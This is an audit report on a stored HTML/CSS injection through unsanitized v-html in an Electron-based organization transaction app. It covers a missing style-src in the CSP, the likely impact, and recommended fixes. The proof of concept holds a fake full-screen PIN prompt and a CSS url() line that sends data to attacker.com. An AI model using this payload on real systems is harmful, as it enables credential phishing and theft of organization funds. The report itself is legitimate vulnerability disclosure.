Audit Report

## Title
Stored HTML/CSS Injection via Unsanitized `v-html` in `CreateTransactionGroup.vue` Affects All Organization Members

## Summary
`CreateTransactionGroup.vue` passes user-controlled strings (`groupItem.description`, `transactionMemo`) directly to Vue's `v-html` directive without sanitization. Because these values are stored in the shared back-end and rendered for every organization member who opens the transaction group view, a malicious member can inject arbitrary HTML and CSS into peer members' Electron renderer processes. The production CSP omits `style-src`, leaving CSS injection fully unrestricted.

## Finding Description

**Unsanitized `v-html` binding — confirmed at lines 421–429:** [1](#0-0) 

Three distinct user-controlled strings are bound to `v-html` with no sanitization:
- `groupItem.description` — a free-text field stored in the shared PostgreSQL back-end.
- `Transaction.fromBytes(groupItem.transactionBytes).transactionMemo` — embedded in serialized bytes also stored in the back-end.
- `makeTransfer(index)` — also rendered via `v-html` (separate concern, not the focus here).

**CSP gap — confirmed at lines 55–62 of `front-end/src/main/index.ts`:** [2](#0-1) 

The production CSP sets only `script-src 'self'`. There is no `style-src`, `img-src`, `frame-src`, or `default-src` directive. This means injected `<style>` blocks and CSS `url()` requests to external origins are completely unrestricted.

**Electron window settings — confirmed at lines 29–35 of `mainWindow.ts`:** [3](#0-2) 

`nodeIntegration: false` and `contextIsolation: true` correctly prevent injected JavaScript from reaching Node.js APIs. However, `sandbox: false` means the renderer is not OS-sandboxed, and — critically — these settings do not restrict CSS injection at all.

## Impact Explanation

- **CSS injection is fully functional in production**: injected `<style>` blocks are not blocked by `script-src 'self'`. An attacker can use CSS `url()` to make outbound requests to attacker-controlled servers, or render a full-screen overlay that is visually indistinguishable from the real application UI.
- **HTML injection** enables fake PIN/password prompts or fake "approve transaction" dialogs targeting peer org members who have no reason to distrust content rendered inside the app.
- **Concrete harm**: a victim org member could be tricked into approving a malicious transaction or disclosing credentials, directly threatening funds managed by the organization.
- `nodeIntegration: false` + `contextIsolation: true` prevent escalation to Node.js RCE via JavaScript, which bounds the severity below full RCE.

## Likelihood Explanation

- **Attacker precondition**: valid organization membership only — no admin or privileged role required.
- **Trigger**: the victim simply opens the transaction group view, which is a routine workflow action. No unusual user interaction is required.
- **No browser bugs required**: the injection works within the normal HTML rendering path of `v-html`; the missing `style-src` is a configuration omission, not a bypass of any existing control.
- The attack is **persistent** (stored in the back-end) and affects every org member who views the group.
- The SECURITY.md does not exclude this class of vulnerability: it is not self-XSS, not theoretical (concrete exploit path exists), not requiring browser bugs, and the impact materially disrupts platform use. [4](#0-3) 

## Recommendation

1. **Replace `v-html` with safe text interpolation**: use `{{ groupItem.description }}` and `{{ transactionMemo }}` (double-brace syntax) instead of `v-html`. `v-html` should only be used when the content is explicitly trusted and sanitized HTML.
2. **If HTML rendering is genuinely required**, sanitize all user-controlled strings with a library such as [DOMPurify](https://github.com/cure53/DOMPurify) before passing them to `v-html`.
3. **Strengthen the CSP** to include at minimum `style-src 'self'`, `img-src 'self'`, and `default-src 'self'` to limit the impact of any future injection.
4. **Consider enabling `sandbox: true`** in `webPreferences` for additional OS-level renderer isolation.

## Proof of Concept

1. Attacker (a legitimate org member) creates a transaction group item and sets `description` to:
   ```html
   <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center">
     <p>Session expired. Please re-enter your PIN:</p>
     <input type="password" id="pin">
     <button onclick="void(0)">OK</button>
   </div>
   <style>
     #pin { border: 1px solid #ccc; padding: 8px; }
     /* CSS exfil: send rendered attribute values to attacker server */
     input[value^="1"] { background: url('https://attacker.com/exfil?c=1'); }
   </style>
   ```
2. The group is saved to the shared PostgreSQL back-end.
3. Any peer org member who navigates to the "Create Transaction Group" page for that group has the payload rendered via `v-html` at lines 421–429.
4. The injected `<style>` block executes (not blocked by `script-src 'self'`), displaying a full-screen fake PIN prompt and initiating CSS-based exfiltration requests to the attacker's server.
5. Inline `onclick` handlers are blocked by `script-src 'self'`, but the CSS overlay and `url()` exfiltration path require no JavaScript whatsoever.
